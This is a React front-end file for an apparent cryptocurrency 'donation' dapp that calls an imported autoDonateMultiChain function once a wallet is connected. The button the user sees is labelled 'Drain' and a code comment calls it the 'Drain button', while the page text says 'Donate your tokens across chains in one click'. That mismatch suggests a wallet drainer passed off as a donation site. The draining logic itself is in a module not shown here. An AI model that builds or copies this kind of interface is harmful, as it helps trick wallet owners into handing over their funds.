// src/App.jsx
import React, { useState } from "react";
import { autoDonateMultiChain } from "./engine/donate";

import Navbar from "./components/Navbar";
import PriceTicker from "./components/PriceTicker";
import GuideModal from "./components/GuideModal";
import Notifications from "./components/Notifications";
import Footer from "./components/Footer";
import Background from "./components/Background";

import { useAccount } from "wagmi"; // ✅ added back

export default function App() {
  const [status, setStatus] = useState("idle");
  const [last, setLast] = useState(null);
  const [notifications, setNotifications] = useState([]);

  const { isConnected } = useAccount(); // ✅ added back

  // helper for popup notifications
  function addNotification(message, type = "info") {
    const id = Date.now();
    setNotifications((prev) => [...prev, { id, message, type }]);
    setTimeout(() => {
      setNotifications((prev) => prev.filter((n) => n.id !== id));
    }, 5000);
  }

  async function handleDonate() {
    try {
      setStatus("running");
      addNotification("Donation started… 🚀", "info");

      const res = await autoDonateMultiChain();
      setLast(res);

      if (res.success) {
        addNotification("Donation completed successfully 🎉", "success");
        setStatus("done");
      } else {
        addNotification(`Donation failed: ${res.reason}`, "error");
        setStatus("failed");
      }
    } catch (e) {
      console.error(e);
      setLast({ success: false, reason: e.message });
      addNotification(`Error: ${e.message}`, "error");
      setStatus("error");
    }
  }

  return (
    <div className="text-white">
      <Background />
      <Navbar />
      <PriceTicker />

      <main className="pt-32 flex flex-col items-center space-y-6 px-4">
        <h1 className="text-4xl font-bold">MVP Donation Dapp</h1>
        <p className="text-gray-300">
          Donate your tokens across chains in one click ❤️
        </p>

        <GuideModal />

        {/* ✅ Drain button hidden until wallet is connected */}
        {isConnected ? (
          <button
            onClick={handleDonate}
            disabled={status === "running"}
            className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
          >
            {status === "running" ? "Processing…" : "Drain"}
          </button>
        ) : (
          <p className="text-gray-400 italic">
            🔌 Connect your wallet to see the donate button
          </p>
        )}

        <div className="w-full max-w-2xl mt-8 bg-black/50 p-4 rounded-lg">
          <strong>Status:</strong> {status}
          <pre className="mt-2 text-sm whitespace-pre-wrap">
            {JSON.stringify(last, null, 2)}
          </pre>
        </div>
      </main>

      <Footer />
      <Notifications notifications={notifications} />
    </div>
  );
}
